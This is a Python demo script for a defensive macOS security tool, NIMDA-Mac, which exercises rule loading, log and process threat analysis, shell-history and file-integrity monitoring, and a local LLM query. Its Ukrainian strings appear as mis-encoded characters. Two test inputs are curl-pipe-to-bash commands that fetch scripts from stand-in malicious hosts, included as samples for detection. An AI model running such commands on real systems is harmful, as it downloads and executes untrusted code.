#!/usr/bin/env python3
"""
–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ–π–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –ø–æ–∫—Ä–∞—â–µ–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ NIMDA-Mac
–Ü–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –≤—Å—ñ—Ö –Ω–æ–≤–∏—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ–≤: RuleManager, ThreatAnalyzer, Enhanced SecurityMonitor
"""

import os
import sys
import time
from datetime import datetime

# –î–æ–¥–∞—î–º–æ —à–ª—è—Ö –¥–æ –∫–æ—Ä–Ω–µ–≤–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from core.rule_manager import RuleManager
from core.threat_analyzer import ThreatAnalyzer
from security_monitor import SecurityMonitor
from llm_security_agent import LLMSecurityAgent

def demo_rule_manager():
    """–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è —Ä–æ–±–æ—Ç–∏ –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –ø—Ä–∞–≤–∏–ª"""
    print("üîç –î–ï–ú–û–ù–°–¢–†–ê–¶–Ü–Ø RULE MANAGER")
    print("=" * 50)
    
    manager = RuleManager()
    
    # –°–ø—Ä–æ–±—É—î–º–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø—Ä–∞–≤–∏–ª–∞
    print("üì• –°–ø—Ä–æ–±–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø—Ä–∞–≤–∏–ª –±–µ–∑–ø–µ–∫–∏...")
    success_count = manager.update_all_rules()
    print(f"‚úÖ –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ {success_count} –Ω–∞–±–æ—Ä—ñ–≤ –ø—Ä–∞–≤–∏–ª")
    
    # –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ –ø—Ä–∞–≤–∏–ª–∞ –≤ –ø–∞–º'—è—Ç—å
    rules = manager.load_rules()
    print(f"üìä –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ {len(rules)} –ø—Ä–∞–≤–∏–ª –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É")
    
    if rules:
        print("\nüìã –ü–µ—Ä—à—ñ 3 –ø—Ä–∞–≤–∏–ª–∞:")
        for i, rule in enumerate(rules[:3], 1):
            print(f"  {i}. {rule[:100]}..." if len(rule) > 100 else f"  {i}. {rule}")
    
    # –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è —Ä–æ–∑–ø–∞—Ä—à–µ–Ω–∏—Ö –ø—Ä–∞–≤–∏–ª
    parsed_rules = manager.get_parsed_rules()
    print(f"\nüîß –†–æ–∑–ø–∞—Ä—à–µ–Ω–æ {len(parsed_rules)} –ø—Ä–∞–≤–∏–ª")
    
    if parsed_rules:
        print("\nüìù –ü–µ—Ä—à—ñ 3 —Ä–æ–∑–ø–∞—Ä—à–µ–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞:")
        for i, rule in enumerate(parsed_rules[:3], 1):
            print(f"  {i}. SID: {rule['sid']}, MSG: '{rule['message']}'")
            if rule['content']:
                print(f"      Content: '{rule['content']}'")
    
    print()

def demo_threat_analyzer():
    """–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è —Ä–æ–±–æ—Ç–∏ –∞–Ω–∞–ª—ñ–∑–∞—Ç–æ—Ä–∞ –∑–∞–≥—Ä–æ–∑"""
    print("üß† –î–ï–ú–û–ù–°–¢–†–ê–¶–Ü–Ø THREAT ANALYZER")
    print("=" * 50)
    
    analyzer = ThreatAnalyzer()
    
    # –¢–µ—Å—Ç 1: –ê–Ω–∞–ª—ñ–∑ –ø—ñ–¥–æ–∑—Ä—ñ–ª–æ–≥–æ –ª–æ–≥—É
    print("üîç –¢–µ—Å—Ç 1: –ê–Ω–∞–ª—ñ–∑ –ø—ñ–¥–æ–∑—Ä—ñ–ª–æ–≥–æ –ª–æ–≥—É")
    suspicious_log = "bash -c 'curl http://malicious-site.com/backdoor.sh | bash'"
    
    print(f"–õ–æ–≥ –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É: {suspicious_log}")
    result = analyzer.analyze_log_entry(suspicious_log)
    
    print("üìä –†–µ–∑—É–ª—å—Ç–∞—Ç –∞–Ω–∞–ª—ñ–∑—É:")
    print(f"  –†—ñ–≤–µ–Ω—å –∑–∞–≥—Ä–æ–∑–∏: {result['threat_level']}")
    print(f"  –ü–æ—Ä—É—à–µ–Ω—å –ø—Ä–∞–≤–∏–ª: {len(result['rule_violations'])}")
    
    if result['rule_violations']:
        print("  –ü–æ—Ä—É—à–µ–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞:")
        for violation in result['rule_violations']:
            print(f"    - SID {violation['sid']}: {violation['message']}")
    
    if result['suggested_actions']:
        print("  –†–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω—ñ –¥—ñ—ó:")
        for action in result['suggested_actions']:
            print(f"    - {action}")
    
    # –¢–µ—Å—Ç 2: –ê–Ω–∞–ª—ñ–∑ –ø—Ä–æ—Ü–µ—Å—É
    print("\nüîç –¢–µ—Å—Ç 2: –ê–Ω–∞–ª—ñ–∑ –ø—ñ–¥–æ–∑—Ä—ñ–ª–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É")
    test_process = {
        'pid': 12345,
        'name': 'python3',
        'user': 'root',
        'path': '/tmp/suspicious_script.py',
        'cmdline': 'python3 /tmp/suspicious_script.py --download-malware'
    }
    
    print(f"–ü—Ä–æ—Ü–µ—Å –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É: {test_process['name']} (PID: {test_process['pid']})")
    process_result = analyzer.analyze_process_activity(test_process)
    
    print("üìä –†–µ–∑—É–ª—å—Ç–∞—Ç –∞–Ω–∞–ª—ñ–∑—É –ø—Ä–æ—Ü–µ—Å—É:")
    print(f"  –†—ñ–≤–µ–Ω—å –∑–∞–≥—Ä–æ–∑–∏: {process_result['threat_level']}")
    print(f"  –ü—ñ–¥–æ–∑—Ä—ñ–ª–∏—Ö —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä—ñ–≤: {len(process_result['suspicious_indicators'])}")
    
    if process_result['suspicious_indicators']:
        print("  –ü—ñ–¥–æ–∑—Ä—ñ–ª—ñ —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä–∏:")
        for indicator in process_result['suspicious_indicators']:
            print(f"    - {indicator}")
    
    if process_result['suggested_commands']:
        print("  –†–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏:")
        for cmd in process_result['suggested_commands']:
            print(f"    - {cmd}")
    
    print()

def demo_enhanced_security_monitor():
    """–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è –ø–æ–∫—Ä–∞—â–µ–Ω–æ–≥–æ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –±–µ–∑–ø–µ–∫–∏"""
    print("üõ°Ô∏è –î–ï–ú–û–ù–°–¢–†–ê–¶–Ü–Ø ENHANCED SECURITY MONITOR")
    print("=" * 50)
    
    monitor = SecurityMonitor()
    
    # –¢–µ—Å—Ç 1: –ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å
    print("üìÇ –¢–µ—Å—Ç 1: –ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏—Ö –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å")
    downloads = monitor.monitor_suspicious_downloads()
    print(f"–ó–Ω–∞–π–¥–µ–Ω–æ {len(downloads)} –Ω–æ–≤–∏—Ö —Ñ–∞–π–ª—ñ–≤ —É Downloads")
    
    if downloads:
        for file_info in downloads[:3]:  # –ü–æ–∫–∞–∑—É—î–º–æ –ø–µ—Ä—à—ñ 3
            print(f"  üìÑ {file_info['filename']}")
            print(f"      –•–µ—à: {file_info['hash'][:16]}...")
            print(f"      –ü—ñ–¥–æ–∑—Ä—ñ–ª–∏–π: {'–¢–∞–∫' if file_info['suspicious'] else '–ù—ñ'}")
    
    # –¢–µ—Å—Ç 2: –ê–Ω–∞–ª—ñ–∑ —ñ—Å—Ç–æ—Ä—ñ—ó –∫–æ–º–∞–Ω–¥
    print("\nüíª –¢–µ—Å—Ç 2: –ê–Ω–∞–ª—ñ–∑ —ñ—Å—Ç–æ—Ä—ñ—ó –∫–æ–º–∞–Ω–¥")
    history = monitor.get_shell_history(10)
    print(f"–û—Ç—Ä–∏–º–∞–Ω–æ {len(history)} –æ—Å—Ç–∞–Ω–Ω—ñ—Ö –∫–æ–º–∞–Ω–¥")
    
    if history:
        print("  –û—Å—Ç–∞–Ω–Ω—ñ –∫–æ–º–∞–Ω–¥–∏:")
        for cmd_info in history[-3:]:  # –ü–æ–∫–∞–∑—É—î–º–æ –æ—Å—Ç–∞–Ω–Ω—ñ 3
            print(f"    {cmd_info['shell']}: {cmd_info['command'][:50]}..." if len(cmd_info['command']) > 50 else f"    {cmd_info['shell']}: {cmd_info['command']}")
    
    # –¢–µ—Å—Ç 3: –ü–æ—à—É–∫ –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏—Ö –∫–æ–º–∞–Ω–¥
    print("\nüö® –¢–µ—Å—Ç 3: –ü–æ—à—É–∫ –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏—Ö –∫–æ–º–∞–Ω–¥")
    suspicious_commands = monitor.analyze_command_history_for_threats()
    print(f"–ó–Ω–∞–π–¥–µ–Ω–æ {len(suspicious_commands)} –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏—Ö –∫–æ–º–∞–Ω–¥")
    
    if suspicious_commands:
        for cmd in suspicious_commands:
            print(f"  ‚ö†Ô∏è –ö–æ–º–∞–Ω–¥–∞: {cmd['command'][:60]}...")
            print(f"      –†—ñ–≤–µ–Ω—å —Ä–∏–∑–∏–∫—É: {cmd['risk_level']}")
            print(f"      Shell: {cmd['shell']}")
    
    # –¢–µ—Å—Ç 4: –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ñ–∞–π–ª—ñ–≤
    print("\nüîí –¢–µ—Å—Ç 4: –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ñ–∞–π–ª—ñ–≤")
    integrity = monitor.monitor_file_integrity()
    print(f"–ü–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ {len(integrity)} —Ñ–∞–π–ª—ñ–≤/–¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ–π")
    
    for path, info in list(integrity.items())[:3]:  # –ü–æ–∫–∞–∑—É—î–º–æ –ø–µ—Ä—à—ñ 3
        print(f"  üìÅ {path}")
        if 'hash' in info:
            print(f"      –•–µ—à: {info['hash'][:16]}...")
        elif 'files_count' in info:
            print(f"      –§–∞–π–ª—ñ–≤: {info['files_count']}")
    
    print()

def demo_ai_integration():
    """–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó –∑ –®–Ü"""
    print("ü§ñ –î–ï–ú–û–ù–°–¢–†–ê–¶–Ü–Ø AI INTEGRATION")
    print("=" * 50)
    
    ai_agent = LLMSecurityAgent()
    
    # –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑ –®–Ü
    print("üîå –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑ Ollama...")
    if ai_agent.check_ollama_connection():
        print("‚úÖ Ollama –¥–æ—Å—Ç—É–ø–Ω–∞")
        
        # –û—Ç—Ä–∏–º—É—î–º–æ –¥–æ—Å—Ç—É–ø–Ω—ñ –º–æ–¥–µ–ª—ñ
        models = ai_agent.get_available_models()
        if models:
            print(f"üìã –î–æ—Å—Ç—É–ø–Ω—ñ –º–æ–¥–µ–ª—ñ: {', '.join(models)}")
        
        # –ü—Ä–æ—Å—Ç–∏–π —Ç–µ—Å—Ç –∞–Ω–∞–ª—ñ–∑—É
        print("\nüß™ –¢–µ—Å—Ç –®–Ü –∞–Ω–∞–ª—ñ–∑—É:")
        test_prompt = "Analyze this suspicious command: 'curl http://malware.com/script.sh | bash'"
        
        try:
            response = ai_agent.query_ollama(test_prompt)
            print(f"üìù –í—ñ–¥–ø–æ–≤—ñ–¥—å –®–Ü: {response[:200]}..." if len(response) > 200 else f"üìù –í—ñ–¥–ø–æ–≤—ñ–¥—å –®–Ü: {response}")
        except Exception as e:
            print(f"‚ùå –ü–æ–º–∏–ª–∫–∞ –®–Ü –∞–Ω–∞–ª—ñ–∑—É: {e}")
    else:
        print("‚ùå Ollama –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞. –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ —Å–µ—Ä–≤—ñ—Å –∑–∞–ø—É—â–µ–Ω–æ.")
    
    print()

def main():
    """–ì–æ–ª–æ–≤–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—ó"""
    print("üöÄ –î–ï–ú–û–ù–°–¢–†–ê–¶–Ü–Ø –ü–û–ö–†–ê–©–ï–ù–û–á –°–ò–°–¢–ï–ú–ò NIMDA-MAC")
    print("=" * 60)
    print(f"‚è∞ –ß–∞—Å –∑–∞–ø—É—Å–∫—É: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    
    try:
        # –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è –≤—Å—ñ—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ–≤
        demo_rule_manager()
        time.sleep(1)
        
        demo_threat_analyzer()
        time.sleep(1)
        
        demo_enhanced_security_monitor()
        time.sleep(1)
        
        demo_ai_integration()
        
        print("üéâ –î–ï–ú–û–ù–°–¢–†–ê–¶–Ü–Ø –ó–ê–í–ï–†–®–ï–ù–ê –£–°–ü–Ü–®–ù–û!")
        print("=" * 60)
        print()
        print("üìã –ù–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏:")
        print("1. –ó–∞–ø—É—Å—Ç—ñ—Ç—å GUI: python gui/nimda_gui.py")
        print("2. –ù–∞–ª–∞—à—Ç—É–π—Ç–µ Ollama –¥–ª—è –ø–æ–≤–Ω–æ—Ü—ñ–Ω–Ω–æ—ó —Ä–æ–±–æ—Ç–∏ –®–Ü")
        print("3. –†–µ–≥—É–ª—è—Ä–Ω–æ –æ–Ω–æ–≤–ª—é–π—Ç–µ –ø—Ä–∞–≤–∏–ª–∞ –±–µ–∑–ø–µ–∫–∏")
        print("4. –ú–æ–Ω—ñ—Ç–æ—Ä—å—Ç–µ –ª–æ–≥–∏ —Ç–∞ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è")
        
    except KeyboardInterrupt:
        print("\nüõë –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—é –ø–µ—Ä–µ—Ä–≤–∞–Ω–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º")
    except Exception as e:
        print(f"\n‚ùå –ü–æ–º–∏–ª–∫–∞ –ø—ñ–¥ —á–∞—Å –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—ó: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
